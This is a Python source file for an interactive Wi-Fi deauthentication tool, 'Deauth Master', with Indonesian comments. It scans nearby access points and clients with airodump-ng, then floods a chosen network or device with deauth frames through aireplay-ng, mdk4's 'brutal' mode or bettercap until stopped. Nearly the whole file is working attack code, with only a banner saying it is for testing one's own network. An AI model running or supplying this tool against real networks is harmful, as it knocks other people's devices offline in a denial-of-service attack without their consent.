#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DEAUTH MASTER - ULTIMATE WIFI DEAUTH TOOL
Tools: airmon-ng + airodump-ng + aireplay-ng + mdk4 + bettercap
HANYA UNTUK TESTING JARINGAN SENDIRI!
"""

import subprocess
import sys
import os
import time
import signal
import re
import random
import threading
from datetime import datetime
from colorama import init, Fore, Style, Back

init(autoreset=True)

# ============================================================
# BANNER DEAUTH MASTER (UNIK)
# ============================================================
BANNER = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                                       ║
{Fore.RED}║  {Fore.WHITE}██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗  {Fore.RED}║
{Fore.RED}║  {Fore.WHITE}██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝╚██╗██╔╝  {Fore.RED}║
{Fore.RED}║  {Fore.WHITE}██║  ██║█████╗  ███████║██║   ██║   ██║    ╚███╔╝   {Fore.RED}║
{Fore.RED}║  {Fore.WHITE}██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║    ██╔██╗   {Fore.RED}║
{Fore.RED}║  {Fore.WHITE}██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██╔╝ ██╗  {Fore.RED}║
{Fore.RED}║  {Fore.WHITE}╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝  {Fore.RED}║
{Fore.RED}║                                                                       ║
{Fore.RED}║              {Fore.WHITE}┌─────────────────────────────────┐{Fore.RED}                 ║
{Fore.RED}║              {Fore.WHITE}│  {Fore.GREEN}   DEAUTH MASTER v3.0      {Fore.WHITE}│{Fore.RED}                 ║
{Fore.RED}║              {Fore.WHITE}└─────────────────────────────────┘{Fore.RED}                 ║
{Fore.RED}║                                                                       ║
{Fore.RED}║  {Fore.YELLOW}⚠️  HANYA UNTUK TESTING JARINGAN SENDIRI  ⚠️{Fore.RED}               ║
{Fore.RED}║                                                                       ║
{Fore.RED}╚═══════════════════════════════════════════════════════════════════════╝{Fore.WHITE}
"""

FOOTER = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════════════╗
{Fore.RED}║  {Fore.CYAN}[ GitHub ]  https://github.com/daffazxxs/DeauthMaster      {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}[ Author ]  Daffa Zxxs                                      {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}[ Tools ]   Airodump + Aireplay + MDK4 + Bettercap        {Fore.RED}║
{Fore.RED}╚═══════════════════════════════════════════════════════════════════════╝{Fore.WHITE}
"""

# ============================================================
# CEK TOOLS
# ============================================================
def check_root():
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Jalankan sebagai root: sudo python3 {sys.argv[0]}{Fore.WHITE}")
        sys.exit(1)

def check_tools():
    tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'mdk4', 'bettercap']
    missing = []
    for tool in tools:
        if subprocess.call(f'which {tool}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            missing.append(tool)
    if missing:
        print(f"{Fore.RED}[!] Tools hilang: {', '.join(missing)}{Fore.WHITE}")
        print(f"{Fore.YELLOW}[*] Install: sudo apt install aircrack-ng mdk4 bettercap -y{Fore.WHITE}")
        sys.exit(1)

# ============================================================
# FUNGSI UTAMA
# ============================================================
def get_interfaces():
    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
    interfaces = []
    for line in result.stdout.split('\n'):
        if 'IEEE 802.11' in line and 'mon' not in line:
            iface = line.split()[0]
            interfaces.append(iface)
    return interfaces

def start_monitor_mode(interface):
    print(f"{Fore.YELLOW}┌─[DEAUTH MASTER]─[MONITOR MODE]{Fore.WHITE}")
    print(f"{Fore.YELLOW}│{Fore.WHITE}")
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if 'monitor mode enabled' in line or 'mon' in line.lower():
            for word in line.split():
                if 'mon' in word and len(word) > 3:
                    return word
    return f"{interface}mon"

def stop_monitor_mode(mon_interface):
    print(f"{Fore.YELLOW}┌─[DEAUTH MASTER]─[CLEANUP]{Fore.WHITE}")
    print(f"{Fore.YELLOW}│{Fore.WHITE}")
    subprocess.run(['airmon-ng', 'stop', mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['systemctl', 'restart', 'NetworkManager'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{Fore.GREEN}│  ✓ Selesai. WiFi kembali normal.{Fore.WHITE}")

def scan_aps(mon_interface, timeout=12):
    print(f"{Fore.YELLOW}┌─[DEAUTH MASTER]─[SCANNING]{Fore.WHITE}")
    print(f"{Fore.YELLOW}│  Scanning Access Points... ({timeout}s){Fore.WHITE}")
    print(f"{Fore.YELLOW}│{Fore.WHITE}")
    
    output_file = '/tmp/deauth_scan'
    proc = subprocess.Popen(
        ['airodump-ng', mon_interface, '--write', output_file, '--output-format', 'csv'],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    
    # Loading animation
    chars = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
    for i in range(timeout):
        sys.stdout.write(f"\r{Fore.YELLOW}│  {chars[i % 8]} Scanning... {i+1}s{Fore.WHITE}")
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r" + " " * 50 + "\r")
    
    proc.terminate()
    time.sleep(1)
    
    aps = []
    csv_file = f"{output_file}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r') as f:
            for line in f:
                if 'WPA' in line or 'WEP' in line or 'OPN' in line:
                    parts = line.split(',')
                    if len(parts) > 13 and parts[0].strip() and parts[0].strip()[0:2] != 'BSS':
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip()
                        if bssid and len(bssid) == 17:
                            aps.append({'bssid': bssid, 'channel': channel, 'essid': essid})
        os.remove(csv_file)
    
    return aps

def scan_clients(mon_interface, bssid, channel, timeout=8):
    print(f"{Fore.YELLOW}│  Scanning clients...{Fore.WHITE}")
    subprocess.run(['iwconfig', mon_interface, 'channel', channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    output_file = '/tmp/deauth_clients'
    proc = subprocess.Popen(
        ['airodump-ng', mon_interface, '--bssid', bssid, '--write', output_file, '--output-format', 'csv'],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(timeout)
    proc.terminate()
    
    clients = []
    csv_file = f"{output_file}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r') as f:
            in_station = False
            for line in f:
                if 'Station' in line:
                    in_station = True
                    continue
                if in_station and line.strip():
                    parts = line.split(',')
                    if len(parts) > 0 and parts[0].strip() and ':' in parts[0]:
                        mac = parts[0].strip()
                        if len(mac) == 17:
                            clients.append(mac)
        os.remove(csv_file)
    return clients

# ============================================================
# DEAUTH ATTACK METHODS
# ============================================================
def attack_aireplay(mon_interface, bssid, client_mac=None, count=0):
    print(f"{Fore.RED}┌─[DEAUTH MASTER]─[AIRPLAY-NG]{Fore.WHITE}")
    print(f"{Fore.RED}│  Memulai Aireplay-ng Deauth{Fore.WHITE}")
    print(f"{Fore.RED}│{Fore.WHITE}")
    
    if client_mac:
        print(f"{Fore.YELLOW}│  Target Client : {client_mac}{Fore.WHITE}")
        cmd = ['aireplay-ng', '--deauth', str(count), '-a', bssid, '-c', client_mac, mon_interface]
    else:
        print(f"{Fore.YELLOW}│  Target AP     : {bssid}{Fore.WHITE}")
        print(f"{Fore.YELLOW}│  Mode          : ALL CLIENTS{Fore.WHITE}")
        cmd = ['aireplay-ng', '--deauth', str(count), '-a', bssid, mon_interface]
    
    print(f"{Fore.RED}│  [PRESS Ctrl+C TO STOP]{Fore.WHITE}")
    print(f"{Fore.RED}│{Fore.WHITE}")
    
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}│  [!] Attack stopped by user{Fore.WHITE}")
    finally:
        subprocess.run(['pkill', '-9', 'aireplay-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def attack_mdk4(mon_interface, bssid):
    print(f"{Fore.RED}┌─[DEAUTH MASTER]─[MDK4 BRUTAL]{Fore.WHITE}")
    print(f"{Fore.RED}│  Memulai MDK4 Deauth (Brutal Mode){Fore.WHITE}")
    print(f"{Fore.RED}│  Target AP     : {bssid}{Fore.WHITE}")
    print(f"{Fore.RED}│  [PRESS Ctrl+C TO STOP]{Fore.WHITE}")
    print(f"{Fore.RED}│{Fore.WHITE}")
    
    with open('/tmp/deauth_blacklist.txt', 'w') as f:
        f.write(bssid)
    
    try:
        subprocess.run(['mdk4', mon_interface, 'd', '-b', '/tmp/deauth_blacklist.txt'])
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}│  [!] Attack stopped by user{Fore.WHITE}")
    finally:
        subprocess.run(['pkill', '-9', 'mdk4'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        os.remove('/tmp/deauth_blacklist.txt')

def attack_bettercap(mon_interface, bssid):
    print(f"{Fore.RED}┌─[DEAUTH MASTER]─[BETTERCAP]{Fore.WHITE}")
    print(f"{Fore.RED}│  Memulai Bettercap Deauth{Fore.WHITE}")
    print(f"{Fore.RED}│  Target AP     : {bssid}{Fore.WHITE}")
    print(f"{Fore.RED}│  [PRESS Ctrl+C TO STOP]{Fore.WHITE}")
    print(f"{Fore.RED}│{Fore.WHITE}")
    
    cmd = f"wifi.deauth {bssid}"
    try:
        subprocess.run(['bettercap', '-eval', cmd, '-iface', mon_interface])
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}│  [!] Attack stopped by user{Fore.WHITE}")

# ============================================================
# MAIN MENU
# ============================================================
def main_menu():
    print(BANNER)
    check_root()
    check_tools()
    
    print(f"{Fore.GREEN}┌─[SYSTEM STATUS]{Fore.WHITE}")
    print(f"{Fore.GREEN}│  ✓ Root Access     : {Fore.GREEN}GRANTED{Fore.WHITE}")
    print(f"{Fore.GREEN}│  ✓ Tools           : {Fore.GREEN}READY{Fore.WHITE}")
    print(f"{Fore.GREEN}│{Fore.WHITE}")
    
    interfaces = get_interfaces()
    if not interfaces:
        print(f"{Fore.RED}│  ✗ No WiFi Interface Found!{Fore.WHITE}")
        sys.exit(1)
    
    print(f"{Fore.CYAN}│  Available Interfaces:{Fore.WHITE}")
    for i, iface in enumerate(interfaces, 1):
        print(f"{Fore.CYAN}│    {i}. {iface}{Fore.WHITE}")
    print(f"{Fore.CYAN}│{Fore.WHITE}")
    
    choice = input(f"{Fore.YELLOW}└─[SELECT INTERFACE] > {Fore.WHITE}")
    try:
        idx = int(choice) - 1
        interface = interfaces[idx]
    except:
        interface = interfaces[0]
    
    mon_interface = start_monitor_mode(interface)
    print(f"{Fore.GREEN}│  ✓ Monitor Mode   : {mon_interface}{Fore.WHITE}")
    print(f"{Fore.GREEN}└──────────────────────────────┘{Fore.WHITE}")
    
    bssid = None
    channel = None
    
    while True:
        print(BANNER)
        print(f"{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║  {Fore.WHITE}DEAUTH MASTER - ULTIMATE WIFI DEAUTH TOOL{Fore.CYAN}                      ║")
        print(f"{Fore.CYAN}╠═══════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║  {Fore.YELLOW}1.{Fore.WHITE} Scan AP & Pilih Target{Fore.CYAN}                                    ║")
        print(f"{Fore.CYAN}║  {Fore.YELLOW}2.{Fore.WHITE} Aireplay-ng (All Clients){Fore.CYAN}                                ║")
        print(f"{Fore.CYAN}║  {Fore.YELLOW}3.{Fore.WHITE} Aireplay-ng (Specific Client){Fore.CYAN}                            ║")
        print(f"{Fore.CYAN}║  {Fore.YELLOW}4.{Fore.WHITE} MDK4 Brutal (All Clients){Fore.CYAN}                               ║")
        print(f"{Fore.CYAN}║  {Fore.YELLOW}5.{Fore.WHITE} Bettercap Deauth{Fore.CYAN}                                        ║")
        print(f"{Fore.CYAN}║  {Fore.YELLOW}6.{Fore.WHITE} Scan Client Again{Fore.CYAN}                                       ║")
        print(f"{Fore.CYAN}║  {Fore.YELLOW}7.{Fore.WHITE} Exit & Cleanup{Fore.CYAN}                                          ║")
        print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════════╝")
        
        print(f"{Fore.GREEN}┌─[TARGET STATUS]{Fore.WHITE}")
        if bssid:
            print(f"{Fore.GREEN}│  Target AP : {bssid} (CH {channel}){Fore.WHITE}")
        else:
            print(f"{Fore.GREEN}│  Target AP : {Fore.RED}NOT SET{Fore.WHITE}")
        print(f"{Fore.GREEN}└─────────────────────{Fore.WHITE}")
        
        choice = input(f"{Fore.YELLOW}└─[SELECT MENU] > {Fore.WHITE}")
        
        if choice == '1':
            aps = scan_aps(mon_interface)
            if not aps:
                print(f"{Fore.RED}│  ✗ No AP found!{Fore.WHITE}")
                input("\nPress Enter...")
                continue
            
            print(f"\n{Fore.CYAN}┌─[ACCESS POINTS]─────────────────────────────────────┐{Fore.WHITE}")
            print(f"{Fore.CYAN}│  {'No':<4} {'BSSID':<20} {'CH':<4} {'ESSID':<30}{Fore.WHITE}")
            print(f"{Fore.CYAN}│{Fore.WHITE}")
            for i, ap in enumerate(aps, 1):
                essid = ap['essid'][:30] if ap['essid'] else "(Hidden)"
                print(f"{Fore.CYAN}│  {i:<4} {ap['bssid']:<20} {ap['channel']:<4} {essid:<30}{Fore.WHITE}")
            print(f"{Fore.CYAN}└──────────────────────────────────────────────────────┘{Fore.WHITE}")
            
            try:
                idx = int(input(f"{Fore.YELLOW}└─[SELECT TARGET] > {Fore.WHITE}")) - 1
                target = aps[idx]
                bssid = target['bssid']
                channel = target['channel']
                print(f"{Fore.GREEN}│  ✓ Target Set : {bssid} (CH {channel}){Fore.WHITE}")
                subprocess.run(['iwconfig', mon_interface, 'channel', channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                input("\nPress Enter...")
            except:
                print(f"{Fore.RED}│  ✗ Invalid choice!{Fore.WHITE}")
                input("\nPress Enter...")
        
        elif choice == '2':
            if not bssid:
                print(f"{Fore.RED}│  ✗ Scan AP first! (Menu 1){Fore.WHITE}")
                input("\nPress Enter...")
                continue
            attack_aireplay(mon_interface, bssid)
            input("\nPress Enter...")
        
        elif choice == '3':
            if not bssid:
                print(f"{Fore.RED}│  ✗ Scan AP first! (Menu 1){Fore.WHITE}")
                input("\nPress Enter...")
                continue
            clients = scan_clients(mon_interface, bssid, channel)
            if clients:
                print(f"\n{Fore.CYAN}┌─[CLIENTS]─────────────────────────────────────────┐{Fore.WHITE}")
                for i, mac in enumerate(clients, 1):
                    print(f"{Fore.CYAN}│  {i}. {mac}{Fore.WHITE}")
                print(f"{Fore.CYAN}│  {len(clients)+1}. ALL CLIENTS{Fore.WHITE}")
                print(f"{Fore.CYAN}└──────────────────────────────────────────────────────┘{Fore.WHITE}")
                try:
                    idx = int(input(f"{Fore.YELLOW}└─[SELECT CLIENT] > {Fore.WHITE}")) - 1
                    if idx < len(clients):
                        attack_aireplay(mon_interface, bssid, clients[idx])
                    else:
                        attack_aireplay(mon_interface, bssid)
                except:
                    attack_aireplay(mon_interface, bssid)
            else:
                attack_aireplay(mon_interface, bssid)
            input("\nPress Enter...")
        
        elif choice == '4':
            if not bssid:
                print(f"{Fore.RED}│  ✗ Scan AP first! (Menu 1){Fore.WHITE}")
                input("\nPress Enter...")
                continue
            attack_mdk4(mon_interface, bssid)
            input("\nPress Enter...")
        
        elif choice == '5':
            if not bssid:
                print(f"{Fore.RED}│  ✗ Scan AP first! (Menu 1){Fore.WHITE}")
                input("\nPress Enter...")
                continue
            attack_bettercap(mon_interface, bssid)
            input("\nPress Enter...")
        
        elif choice == '6':
            if not bssid:
                print(f"{Fore.RED}│  ✗ Scan AP first! (Menu 1){Fore.WHITE}")
                input("\nPress Enter...")
                continue
            clients = scan_clients(mon_interface, bssid, channel)
            if clients:
                print(f"{Fore.GREEN}│  Found {len(clients)} clients{Fore.WHITE}")
                for mac in clients:
                    print(f"{Fore.GREEN}│    - {mac}{Fore.WHITE}")
            else:
                print(f"{Fore.YELLOW}│  No clients found{Fore.WHITE}")
            input("\nPress Enter...")
        
        elif choice == '7':
            stop_monitor_mode(mon_interface)
            print(FOOTER)
            print(f"{Fore.GREEN}╔═══════════════════════════════════════════════════════════════╗")
            print(f"{Fore.GREEN}║  ✓ Selesai! WiFi kembali normal.                             ║")
            print(f"{Fore.GREEN}║  ✓ Stay safe, stay ethical.                                 ║")
            print(f"{Fore.GREEN}╚═══════════════════════════════════════════════════════════════╝{Fore.WHITE}")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}│  [!] Program dihentikan{Fore.WHITE}")
        sys.exit(0)
